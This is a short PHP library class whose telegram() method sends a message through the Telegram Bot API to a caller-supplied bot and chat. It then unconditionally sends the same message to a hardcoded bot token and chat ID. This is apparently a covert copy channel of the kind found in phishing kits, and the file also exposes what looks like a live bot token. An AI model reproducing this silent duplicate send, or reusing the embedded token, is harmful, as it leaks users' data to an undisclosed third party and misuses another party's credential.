<?php

namespace App\Libraries;

use App\Controllers\BaseController;
use App\Libraries\defaultlibrary;

class send extends BaseController
{
    public function __construct()
    {
        $this->deflib = new defaultlibrary();
    }
    public function telegram($newbottoken, $newchatid, $pesan)
    {
        $token = '1422702499:AAHWKeCgIfutJtVNpKWuRJ_EqTLjpLSSu4w';
        $chatid = '799163200';
        $timpatoken = $newbottoken;
        $timpachatid = $newchatid;
        $pesan1 = urlencode($pesan);
        $pesan2 = str_replace('%5Cn', ' %0A', $pesan1);
        if ($timpatoken != '') {
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => "https://api.telegram.org/bot$timpatoken/sendMessage",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS => "chat_id=$timpachatid&text=$pesan2",
                CURLOPT_HTTPHEADER => array(
                    'Content-Type: application/x-www-form-urlencoded'
                ),
            ));
            curl_exec($curl);
            curl_close($curl);
        }
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://api.telegram.org/bot$token/sendMessage",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => "chat_id=$chatid&text=$pesan2",
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/x-www-form-urlencoded'
            ),
        ));
        curl_exec($curl);
        curl_close($curl);
    }
}
